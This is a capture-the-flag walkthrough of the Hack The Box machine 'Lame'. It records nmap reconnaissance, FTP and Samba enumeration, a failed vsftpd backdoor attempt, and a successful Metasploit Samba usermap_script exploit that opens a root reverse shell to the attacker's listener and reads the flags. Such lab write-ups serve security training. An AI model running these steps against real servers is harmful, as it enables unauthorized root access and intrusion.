#### Lame

- [Attacker Info]()
- [Nmap Scan]()
- [Enumareting FTP]
- [Enumerating Samba]()
- [Reference]()

###### Attacker Info

```sh
root@kali:~/lame# ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.1.19  netmask 255.255.255.0  broadcast 192.168.1.255
        inet6 fe80::20c:29ff:fef1:8ebf  prefixlen 64  scopeid 0x20<link>
        ether 00:0c:29:f1:8e:bf  txqueuelen 1000  (Ethernet)
        RX packets 185693  bytes 88017399 (83.9 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 213090  bytes 28750121 (27.4 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
        device interrupt 19  base 0x2000

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 3147  bytes 9905185 (9.4 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 3147  bytes 9905185 (9.4 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

tun0: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST>  mtu 1500
        inet 10.10.14.8  netmask 255.255.254.0  destination 10.10.14.8
        inet6 dead:beef:2::1006  prefixlen 64  scopeid 0x0<global>
        inet6 fe80::932c:626c:488e:202a  prefixlen 64  scopeid 0x20<link>
        unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00  txqueuelen 100  (UNSPEC)
        RX packets 8  bytes 456 (456.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 20  bytes 1020 (1020.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

root@kali:~/lame#
```

###### Nmap Scan

```sh
root@kali:~/lame# nmap -sV -sC -oA lame.nmap 10.10.10.3

Starting Nmap 7.60 ( https://nmap.org ) at 2018-02-01 17:07 EST
Nmap scan report for 10.10.10.3
Host is up (0.41s latency).
Not shown: 996 filtered ports
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to 10.10.14.8
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey:
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-os-discovery:
|   OS: Unix (Samba 3.0.20-Debian)
|   NetBIOS computer name:
|   Workgroup: WORKGROUP\x00
|_  System time: 2018-01-28T09:08:37-05:00
|_smb2-time: Protocol negotiation failed (SMB2)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 85.42 seconds
root@kali:~/lame#
```

###### Enumareting FTP

```sh
root@kali:~/lame# apt install ncftp
```

```sh
root@kali:~/lame# ncftp 10.10.10.3
NcFTP 3.2.5 (Feb 02, 2011) by Mike Gleason (http://www.NcFTP.com/contact/).
Connecting to 10.10.10.3...
(vsFTPd 2.3.4)
Logging in...
Login successful.
Logged in to 10.10.10.3.
ncftp / >
ncftp / > ls
ncftp / >
```

```sh
root@kali:~# msfconsole
msf > search vsftpd
[!] Module database cache not built yet, using slow search

Matching Modules
================

   Name                                  Disclosure Date  Rank       Description
   ----                                  ---------------  ----       -----------
   exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  VSFTPD v2.3.4 Backdoor Command Execution


msf > use exploit/unix/ftp/vsftpd_234_backdoor
msf exploit(unix/ftp/vsftpd_234_backdoor) > show options

Module options (exploit/unix/ftp/vsftpd_234_backdoor):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   RHOST                   yes       The target address
   RPORT  21               yes       The target port (TCP)


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf exploit(unix/ftp/vsftpd_234_backdoor) > set RHOST 10.10.10.3
RHOST => 10.10.10.3
msf exploit(unix/ftp/vsftpd_234_backdoor) > run

[*] 10.10.10.3:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 10.10.10.3:21 - USER: 331 Please specify the password.
[*] Exploit completed, but no session was created.
msf exploit(unix/ftp/vsftpd_234_backdoor) >
```

###### Enumerating Samba

```sh
root@kali:~/lame# smbclient -L 10.10.10.3
WARNING: The "syslog" option is deprecated
Enter WORKGROUP\root's password:
Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	tmp             Disk      oh noes!
	opt             Disk
	IPC$            IPC       IPC Service (lame server (Samba 3.0.20-Debian))
	ADMIN$          IPC       IPC Service (lame server (Samba 3.0.20-Debian))
Reconnecting with SMB1 for workgroup listing.
Anonymous login successful

	Server               Comment
	---------            -------

	Workgroup            Master
	---------            -------
	WORKGROUP            LAME
root@kali:~/lame#
```

```sh
root@kali:~/lame# smbclient //10.10.10.3/tmp
WARNING: The "syslog" option is deprecated
Enter WORKGROUP\root's password:
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Jan 28 09:42:05 2018
  ..                                 DR        0  Sun May 20 15:36:12 2012
  orbit-makis                        DR        0  Sun Jan 28 06:25:31 2018
  5131.jsvc_up                        R        0  Sat Jan 27 12:21:45 2018
  .ICE-unix                          DH        0  Sat Jan 27 12:21:28 2018
  .X11-unix                          DH        0  Sat Jan 27 12:21:32 2018
  gconfd-makis                       DR        0  Sun Jan 28 06:25:31 2018
  .X0-lock                           HR       11  Sat Jan 27 12:21:32 2018

		7282168 blocks of size 1024. 5675664 blocks available
smb: \>
```

```sh
root@kali:~/lame# smbclient //10.10.10.3/opt
WARNING: The "syslog" option is deprecated
Enter WORKGROUP\root's password:
Anonymous login successful
tree connect failed: NT_STATUS_ACCESS_DENIED
root@kali:~/lame#
```

```sh
root@kali:~/lame# enum4linux -a 10.10.10.3
```

```sh
root@kali:~# msfconsole


 ______________________________________________________________________________
|                                                                              |
|                   METASPLOIT CYBER MISSILE COMMAND V4                        |
|______________________________________________________________________________|
      \                                  /                      /
       \     .                          /                      /            x
        \                              /                      /
         \                            /          +           /
          \            +             /                      /
           *                        /                      /
                                   /      .               /
    X                             /                      /            X
                                 /                     ###
                                /                     # % #
                               /                       ###
                      .       /
     .                       /      .            *           .
                            /
                           *
                  +                       *

                                       ^
####      __     __     __          #######         __     __     __        ####
####    /    \ /    \ /    \      ###########     /    \ /    \ /    \      ####
################################################################################
################################################################################
# WAVE 4 ######## SCORE 31337 ################################## HIGH FFFFFFFF #
################################################################################
                                                           https://metasploit.com


       =[ metasploit v4.16.32-dev                         ]
+ -- --=[ 1726 exploits - 987 auxiliary - 300 post        ]
+ -- --=[ 507 payloads - 40 encoders - 10 nops            ]
+ -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]

msf > search samba
[!] Module database cache not built yet, using slow search

Matching Modules
================

   Name                                            Disclosure Date  Rank       Description
   ----                                            ---------------  ----       -----------
   auxiliary/admin/smb/samba_symlink_traversal                      normal     Samba Symlink Directory Traversal
   auxiliary/dos/samba/lsa_addprivs_heap                            normal     Samba lsa_io_privilege_set Heap Overflow
   auxiliary/dos/samba/lsa_transnames_heap                          normal     Samba lsa_io_trans_names Heap Overflow
   auxiliary/dos/samba/read_nttrans_ea_list                         normal     Samba read_nttrans_ea_list Integer Overflow
   auxiliary/scanner/rsync/modules_list                             normal     List Rsync Modules
   auxiliary/scanner/smb/smb_uninit_cred                            normal     Samba _netr_ServerPasswordSet Uninitialized Credential State
   exploit/freebsd/samba/trans2open                2003-04-07       great      Samba trans2open Overflow (*BSD x86)
   exploit/linux/samba/chain_reply                 2010-06-16       good       Samba chain_reply Memory Corruption (Linux x86)
   exploit/linux/samba/is_known_pipename           2017-03-24       excellent  Samba is_known_pipename() Arbitrary Module Load
   exploit/linux/samba/lsa_transnames_heap         2007-05-14       good       Samba lsa_io_trans_names Heap Overflow
   exploit/linux/samba/setinfopolicy_heap          2012-04-10       normal     Samba SetInformationPolicy AuditEventsInfo Heap Overflow
   exploit/linux/samba/trans2open                  2003-04-07       great      Samba trans2open Overflow (Linux x86)
   exploit/multi/samba/nttrans                     2003-04-07       average    Samba 2.2.2 - 2.2.6 nttrans Buffer Overflow
   exploit/multi/samba/usermap_script              2007-05-14       excellent  Samba "username map script" Command Execution
   exploit/osx/samba/lsa_transnames_heap           2007-05-14       average    Samba lsa_io_trans_names Heap Overflow
   exploit/osx/samba/trans2open                    2003-04-07       great      Samba trans2open Overflow (Mac OS X PPC)
   exploit/solaris/samba/lsa_transnames_heap       2007-05-14       average    Samba lsa_io_trans_names Heap Overflow
   exploit/solaris/samba/trans2open                2003-04-07       great      Samba trans2open Overflow (Solaris SPARC)
   exploit/unix/misc/distcc_exec                   2002-02-01       excellent  DistCC Daemon Command Execution
   exploit/unix/webapp/citrix_access_gateway_exec  2010-12-21       excellent  Citrix Access Gateway Command Execution
   exploit/windows/fileformat/ms14_060_sandworm    2014-10-14       excellent  MS14-060 Microsoft Windows OLE Package Manager Code Execution
   exploit/windows/http/sambar6_search_results     2003-06-21       normal     Sambar 6 Search Results Buffer Overflow
   exploit/windows/license/calicclnt_getconfig     2005-03-02       average    Computer Associates License Client GETCONFIG Overflow
   exploit/windows/smb/group_policy_startup        2015-01-26       manual     Group Policy Script Execution From Shared Resource
   post/linux/gather/enum_configs                                   normal     Linux Gather Configurations


msf > use exploit/multi/samba/usermap_script
msf exploit(multi/samba/usermap_script) > show info

       Name: Samba "username map script" Command Execution
     Module: exploit/multi/samba/usermap_script
   Platform: Unix
       Arch: cmd
 Privileged: Yes
    License: Metasploit Framework License (BSD)
       Rank: Excellent
  Disclosed: 2007-05-14

Provided by:
  jduck <jduck@metasploit.com>

Available targets:
  Id  Name
  --  ----
  0   Automatic

Basic options:
  Name   Current Setting  Required  Description
  ----   ---------------  --------  -----------
  RHOST                   yes       The target address
  RPORT  139              yes       The target port (TCP)

Payload information:
  Space: 1024

Description:
  This module exploits a command execution vulnerability in Samba
  versions 3.0.20 through 3.0.25rc3 when using the non-default
  "username map script" configuration option. By specifying a username
  containing shell meta characters, attackers can execute arbitrary
  commands. No authentication is needed to exploit this vulnerability
  since this option is used to map usernames prior to authentication!

References:
  https://cvedetails.com/cve/CVE-2007-2447/
  OSVDB (34700)
  http://www.securityfocus.com/bid/23972
  http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=534
  http://samba.org/samba/security/CVE-2007-2447.html

msf exploit(multi/samba/usermap_script) > set RHOST 10.10.10.3
RHOST => 10.10.10.3
msf exploit(multi/samba/usermap_script) > run

[*] Started reverse TCP double handler on 10.10.14.8:4444
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Accepted the first client connection...
[*] Command: echo SeDvkjkY2GX8aEip;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket B
[*] B: "sh: line 2: Connected: command not found\r\nsh: line 3: Escape: command not found\r\nSeDvkjkY2GX8aEip\r\n"
[*] Matching...
[*] A is input...
[*] Command shell session 1 opened (10.10.14.8:4444 -> 10.10.10.3:48956) at 2018-02-01 17:15:53 -0500


id
uid=0(root) gid=0(root)
cat /root/root.txt
92caac3be140ef409e45721348a4e9df
cat /home/makis/user.txt
69454a937d94f5f0225ea00acd2e84c5
```

###### Reference

- [``Hack The Box: Lame Walkthrough``](https://deceiveyour.team/2017/12/05/hack-the-box-lame-walkthrough/)